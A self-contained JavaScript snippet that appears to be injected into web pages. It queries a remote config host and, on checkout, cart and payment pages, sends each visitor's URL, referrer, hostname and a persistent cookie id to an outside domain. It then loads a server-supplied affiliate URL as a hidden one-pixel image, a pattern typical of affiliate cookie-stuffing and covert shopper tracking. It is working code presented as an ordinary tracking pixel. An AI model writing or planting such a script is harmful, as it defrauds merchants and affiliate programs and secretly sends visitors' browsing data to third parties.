(function () {
  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
  const RETRACK_URL = 'https://zoomersclicks.com/api/retrack';
  const FALLBACK_PIXEL_URL = 'https://zoomersclicks.com/api/fallback-pixel?id=';
  const TRACKED_PATH_KEYWORDS = ['cart', 'payment', 'shipping', 'checkout', 'pay', 'review-order'];

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = Math.random() * 0x10 | 0x0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(0x10);
    });
  }

  function getCookie(name) {
    const nameEQ = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
    }
    return '';
  }

  function isTrackedPath() {
    const path = window.location.pathname.toLowerCase();
    return TRACKED_PATH_KEYWORDS.some(function (keyword) {
      return path.includes(keyword);
    });
  }

  function createTrackingPixel(src) {
    const container = document.body || document.documentElement;
    if (!container) return;
    const img = document.createElement('img');
    img.src = src;
    img.style.width = '1px';
    img.style.height = '1px';
    img.style.display = 'none';
    img.style.visibility = 'hidden';
    container.appendChild(img);
  }

  async function doRetrack() {
    try {
      const uuid = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uuid + '; expires=' + expires + ';path=/;SameSite=Lax';

      const res = await fetch(RETRACK_URL, {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uuid,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      const data = await res.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
      } else {
        createTrackingPixel(FALLBACK_PIXEL_URL + uuid);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function fetchConfigAndTrack() {
    const url = CONFIG_URL + encodeURIComponent(window.location.hostname);
    fetch(url)
      .then(function (res) {
        if (!res.ok) throw new Error('Config API Failed');
        return res.json();
      })
      .then(function (data) {
        if (!data || (!data.always && !data.cartExtra)) return;
        (data.always || (data.cartExtra && isTrackedPath())) && doRetrack();
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    fetchConfigAndTrack();
  } else {
    window.addEventListener('DOMContentLoaded', fetchConfigAndTrack);
  }
})();
